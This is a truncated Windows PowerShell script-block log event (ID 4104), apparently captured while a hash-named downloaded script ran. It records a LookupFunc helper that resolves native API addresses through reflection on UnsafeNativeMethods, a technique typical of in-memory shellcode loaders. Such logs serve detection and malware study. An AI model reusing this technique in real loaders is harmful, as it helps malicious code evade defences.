@{ScriptBlockText=function LookupFunc {



	Param ($moduleName, $functionName)



	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 

    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].

      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp=@()

    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}

	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $f [TRUNCATED]; Path=C:\Users\azure\Downloads\9d5e06da22a3c8b527516187f7753ee43a4929465d2c6ca58de0851323c44aa8.ps1; ScriptBlockId=5b586954-4ac5-491e-8e0d-f6d3d8499216; MessageTotal=1; MessageNumber=1; EventID=4104}

